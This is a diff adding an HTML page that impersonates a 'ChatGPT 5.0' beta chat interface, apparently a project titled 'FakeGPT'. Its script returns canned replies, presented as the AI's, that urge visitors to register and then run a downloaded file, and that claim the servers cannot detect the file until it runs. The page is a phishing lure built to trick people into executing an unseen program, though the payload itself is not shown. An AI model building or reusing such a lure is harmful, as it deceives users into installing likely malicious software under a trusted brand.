@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT 5.0</title>
+    <link rel="icon" href="C:\Users\Naor\Documents\Uni\FakeGPT\logo.ico" type="image/x-icon">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #212121; /* Updated background color to #212121 */
+            color: white; /* Text color */
+            font-family: Arial, sans-serif;
+            min-height: 100vh; /* Ensures the content stretches to the full height of the viewport */
+            position: relative; /* Establishes the body as the positioning context for the absolute positioned element */
+        }
+
+        .left-container {
+            width: 220px; /* Adjust the width as needed */
+            height: 100%; /* Full height of the viewport */
+            background-color: #171717; /* Background color of the container */
+            position: fixed; /* Fixed positioning so it stays on the left side */
+            top: 0; /* Align to the top */
+            left: 0; /* Align to the left */
+            padding: 20px; /* Optional padding */
+            z-index: 3;
+        }
+
+        .right-container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+            z-index: 1;
+        }
+
+        .text-area-container {
+            position: fixed;
+            bottom: 30px;
+            left: 57%;
+            transform: translateX(-50%);
+            border: 1px solid #4d4d4d; /* Change the border color here */
+            width: 40%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #212121;
+            padding: 2px;
+            border-radius: 15px; /* Adjusted border-radius to make it less cubic */
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            z-index: 2;
+        }
+
+        .text-area {
+            flex: 1;
+        }
+
+        .button-container {
+            display: flex;
+            align-items: center; /* Center vertically */
+            margin-left: auto; /* Push the container to the far right */
+            margin-right: 10px; /* Add some margin to separate from the textarea */
+        }
+
+        .text-area-container textarea {
+            width: calc(100% - 40px); /* Adjusted width to leave space for the button */
+            height: 26px;
+            outline: none; /* Removes the outline when focused */
+            padding: 10px;
+            border: none;
+            border-radius: 15px; /* Adjusted border-radius to make it less cubic */
+            background-color: #212121;
+            resize: none;
+            margin-bottom: 0px;
+            color: white;
+            line-height: 30px;
+            font-size: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+            overflow-y: hidden; /* Hide vertical scrollbar */
+        }
+
+        .text-area-container img#send-button {
+            width: 30px; /* Adjust the width of the button */
+            height: 30px; /* Adjust the height of the button */
+            cursor: pointer;
+        }
+
+        .warning {
+            position: fixed;
+            bottom: 10px;
+            transform: translateX(-50%);
+            left: 57%;
+            font-size: 11px; /* Adjusted font size */
+            font-weight: 0; /* Adjusted font weight */
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            color: rgba(255, 255, 255, 0.7); /* Adjusted color */
+        }
+
+        .chatGPT_5-image {
+            position: absolute;
+            top: 10px;
+            left: 265px;
+            padding: 2px;
+            border-radius: 5px; /* Rounded border */
+        }
+        
+        .afterWeStart-textarea {
+            display: none;
+            width: 40%;
+            position: absolute;
+            top: calc(100px); /* Adjust distance from the bottom as needed */
+            left: 57%;
+            transform: translateX(-50%); /* Center horizontally */
+            padding: 20px; /* Adjust padding as needed */
+            border: none; /* Border style */
+            background-color: #212121; /* Background color */
+            resize: none;
+            color: white; /* Text color */
+            font-size: medium;
+            outline: none; /* Removes the outline when focused */
+            font-family: Arial, Helvetica, sans-serif; /* Font family */
+            line-height: 30px;
+            overflow-y: hidden; /* Hide vertical scrollbar */
+            z-index: 1; /* Ensure it appears above other elements */
+
+            }
+
+            .afterWeStart-image {
+            display: none;
+            width: 30px; /* Adjust the width of the image as needed */
+            height: 30px; /* Adjust the height of the image as needed */
+            position: absolute;
+            top: calc(100px); /* Adjust distance from the bottom as needed */
+            left: 35%;
+            transform: translateX(-50%); /* Center horizontally */
+            padding: 20px; /* Adjust padding as needed */
+            border: none; /* Border style */
+            background-color: #212121; /* Background color */
+            resize: none;
+            overflow-y: hidden; /* Hide vertical scrollbar */
+            z-index: 1; /* Ensure it appears above other elements */
+            border-radius: 50%; /* Make it a circle */
+
+            }
+        
+
+
+        .beforeWeStart-image {
+            position: absolute;
+            bottom: calc(65px); /* Adjust distance from the bottom as needed */
+            left: 57%;
+            transform: translateX(-50%); /* Center horizontally */
+            padding: 20px; /* Adjust padding as needed */
+            border: none; /* Border style */
+            background-color: #212121; /* Background color */
+            cursor: pointer;
+            resize: none;
+            color: white; /* Text color */
+            line-height: 30px;
+            overflow-y: hidden; /* Hide vertical scrollbar */
+            z-index: 1; /* Ensure it appears above other elements */
+            }
+
+        .gray-text {
+            color: #b4b4b4;
+        }
+
+        .left-image {
+            width: 30px; /* Adjust the width of the image as needed */
+            height: 30px; /* Adjust the height of the image as needed */
+            position: absolute; /* Position the image */
+            bottom: 68px; /* Adjust distance from the bottom as needed */
+            left: 10px; /* Adjust distance from the left as needed */
+            border-radius: 50%; /* Make it a circle */
+
+        }
+
+        .new_chat_image {
+            position: absolute; /* Position the image */
+            top: 10px; /* Adjust distance from the top as needed */
+            left: 10px; /* Adjust distance from the left as needed */
+            border-radius: 5px; /* Rounded border */
+        }
+
+        .username-text {
+            position: absolute;
+            bottom: 60px; /* Adjust distance from the bottom as needed */
+            left: 40px; /* Adjust distance from the left as needed */
+            width: 80%; /* Adjust the width of the textbox as needed */
+            padding: 10px; /* Adjust padding as needed */
+            border: none; /* Border style */
+            border-radius: 5px; /* Rounded border */
+            color: white; /* Text color */
+            font-size: 14px; /* Font size */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Font family */
+        }
+        .register-button-image{
+            position: absolute;
+            cursor: pointer;
+            bottom: 100px; /* Adjust distance from the bottom as needed */
+            left: 0px; /* Adjust distance from the left as needed */
+            padding: 10px; /* Adjust padding as needed */
+            border: none; /* Border style */
+            display: inline-block;
+            border-radius: 5px; /* Rounded border */
+        }
+
+        /* Apply outline style when image is hovered */
+        .new_chat_image:hover {
+            outline: 2px solid #282424; /* Example outline style */
+        }
+        .register-button-image:hover {
+            outline: 1px solid #282424; /* Example outline style */
+        }
+        .chatGPT_5-image:hover{
+            outline: 1px solid #302c2c; /* Example outline style */
+        }
+    </style>
+</head>
+<body>
+    <div class="left-container">
+        <!-- Content for the left container goes here -->
+        <a href="https://chat.openai.com/">
+        <img src="New chat.png" alt="Your Image" class="new_chat_image"> </a>
+        <div class="username-text">Unknown Account</div>
+        <img src="Unknown_person.png" alt="Your Image" class="left-image">
+        <img src="Register_For_Beta.png" alt="Register" class="register-button-image">
+
+    </div>
+
+    <div class="text-area-container">
+        <div class="text-area">
+            <textarea id="message-textarea" placeholder="Message ChatGPT..." rows="2" oninput="onTyping()"></textarea>
+        </div>
+        <div class="button-container">
+            <img id="send-button" src="button.png" alt="Send"> <!-- Image button -->
+        </div>
+    </div>
+
+    <div class="right-container">
+        <!-- Your content goes here -->
+        <div class="chatGPT_5">
+            <a href="https://chat.openai.com/">
+                <img src="chatGPT_5.0.png" alt="Your Image" class="chatGPT_5-image">
+        </a>
+        <img src="BeforeWeStart.png" alt="beforewestart" class="beforeWeStart-image">
+        <div id="text">
+            <textarea class="afterWeStart-textarea" id="afterWeStart-textarea" placeholder="" rows="16" readonly></textarea>
+            <img src="Unknown_person.png" alt="Your Image" class="afterWeStart-image">
+        </div>
+
+        </div>
+    </div>
+    <div class="warning">
+        ChatGPT5 is still in beta therefore it can make mistakes. Consider checking important information.
+    </div>
+
+    <script>
+        var flagButtonPressed = false;
+        var button = document.getElementById("send-button");
+
+        document.querySelector(".register-button-image").addEventListener("click", function() {
+            // Open a new pop-up window for registration
+            window.open("registration.html", "Registration", "width=400,height=600");
+        });
+        
+
+        //12 Generated comments for the chat button
+        var replies = [
+        "Hi there! \nBefore we start to use this BETA, you need to click on the registration button to your left and after finishing the registration, you need to run the downloaded file we delivered to you in the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we cannot detect the file running over your computer in our servers, so please make sure you run the file.\n",
+        "Hello there!\nBefore we begin to use this BETA, it's necessary to click on the registration button to your left and after completing the registration, you must run the downloaded file we provided to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we are unable to detect the file running on your computer in our servers, so please ensure you run the file.\n",
+        "Hey how are you? \nBefore you start using this BETA, make sure to click on the registration button to your left and after you finish the registration, run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we cannot detect the file running on your computer in our servers, so please make sure you run the file.Let me know if you have any questions.\n",
+        "Hola what's up? \nBefore beginning to use this BETA, click on the registration button to your left and after completing the registration, run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we are unable to detect the file running over your computer in our servers, so ensure you run the file.\n",
+        "Hello how are you?\nBefore starting to use this BETA, ensure to click on the registration button to your left and after you finish the registration, you need to run the downloaded file we provided to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we cannot detect the file running over your computer in our servers, so please make sure you run the file.\n",
+        "Hey there how you doing?\nBefore we start using this BETA version, click on the registration button to your left and after finishing the registration, you should run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we are unable to detect the file running on your computer in our servers, so ensure you run the file.\n",
+        "Dear user,\nBefore you start to use this BETA, you need to click on the registration button to your left and after you complete the registration, make sure to run the downloaded file we delivered to you in the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we cannot detect the file running over your computer in our servers, so please make sure you run the file.\n",
+        "Hi!\nBefore you begin using this BETA, ensure to click on the registration button to your left and after finishing the registration, run the downloaded file we provided to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we are unable to detect the file running on your computer in our servers, so ensure you run the file.\n",
+        "Hello user!\nBefore we start to use this BETA, make sure to click on the registration button to your left and after completing the registration, you need to run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we cannot detect the file running over your computer in our servers, so please make sure you run the file.\n",
+        "Hi user\nBefore we begin using this BETA version, click on the registration button to your left and after you complete the registration, you must run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we are unable to detect the file running on your computer in our servers, so ensure you run the file.\n",
+        "How are you :)?\nBefore you start using this BETA version, ensure to click on the registration button to your left and after completing the registration, make sure to run the downloaded file we provided to you at the end of the registration, after this, refresh the page or click on new chat.If you have already registered, we cannot detect the file running over your computer in our servers, so please make sure you run the file.\n",
+        "What's up?\nBefore beginning to use this BETA, click on the registration button to your left and after finishing the registration, ensure to run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat. If you have already registered, we are unable to detect the file running on your computer in our servers, so ensure you run the file.\n",
+        "How you doing? \nBefore you start to use this BETA, make sure to click on the registration button to your left and after you complete the registration, make sure to run the downloaded file we delivered to you at the end of the registration, after this, refresh the page or click on new chat\n"
+    ];
+
+    document.querySelector(".beforeWeStart-image").addEventListener("click", function(){//when you click on the big image in the middle of the page it will disappear and start a chat
+        if (!flagButtonPressed) {
+            flagButtonPressed=true;
+            button.setAttribute("src", "pauseButton.png");
+            document.querySelector(".beforeWeStart-image").style.display = "none";
+            var afterTextarea = document.querySelector(".afterWeStart-textarea");
+            document.querySelector(".afterWeStart-image").style.display = "block";
+            afterTextarea.style.display = "block"; // Display the textarea
+            var randomNumber = Math.floor(Math.random() * 13);
+            simulateChat("ChatGPT 5:\n"+replies[randomNumber]);
+        }
+    });
+
+
+        document.getElementById("send-button").addEventListener("click", function() {//when you click on the send button it will start a check if the user can send it and if he does it will apear in the chat and start a conversation
+            var message = document.getElementById("message-textarea").value;
+            if (!flagButtonPressed) {
+                if (message.length > 0) {
+                    flagButtonPressed = true;
+                    document.querySelector(".beforeWeStart-image").style.display = "none";
+                    var afterTextarea = document.querySelector(".afterWeStart-textarea");
+                    document.querySelector(".afterWeStart-image").style.display = "block";
+                    afterTextarea.style.display = "block"; // Display the textarea
+                    document.getElementById("message-textarea").value = ""; // Clear the textarea
+                    button.setAttribute("src", "pauseButton.png");
+                    // Append the new message to the existing value
+                    afterTextarea.value += "You:\n" + message + "\n";
+                    var randomNumber = Math.floor(Math.random() * 13);
+                    simulateChat("ChatGPT 5:\n"+replies[randomNumber]);
+                }
+            }
+        });
+
+    function simulateChat(reply) {//simulation of a bot chat message
+        var delay = Math.floor(Math.random() * 1000);
+        setTimeout(function() {
+            typeMessage(reply, 0, 30, function() {
+                flagButtonPressed = false; // Reset flagButtonPressed to false after chat simulation completes
+                button.setAttribute("src", "button.png");
+
+            });
+        }, delay);
+    }
+
+    function typeMessage(message, index, interval, callback) {
+        var afterTextarea = document.querySelector(".afterWeStart-textarea");
+        if (index < message.length) {
+            afterTextarea.value += message.charAt(index);
+            setTimeout(function() {
+                typeMessage(message, index + 1, interval, callback);
+            }, interval);
+        } else {
+            // Call the callback function once message typing is complete
+            if (typeof callback === 'function') {
+                callback();
+            }
+        }
+    }
+
+    function onTyping() {
+        if(document.getElementById("message-textarea").value.length >  0)
+            button.setAttribute("src", "onTyping.png");
+        else
+            button.setAttribute("src", "button.png");
+    }
+    
+    document.getElementById("message-textarea").addEventListener("keyup", (e) => {
+        if (e.key === "Enter") {
+            document.getElementById("send-button").click();
+        }
+    });
+    </script>
+
+</body>
+</html>
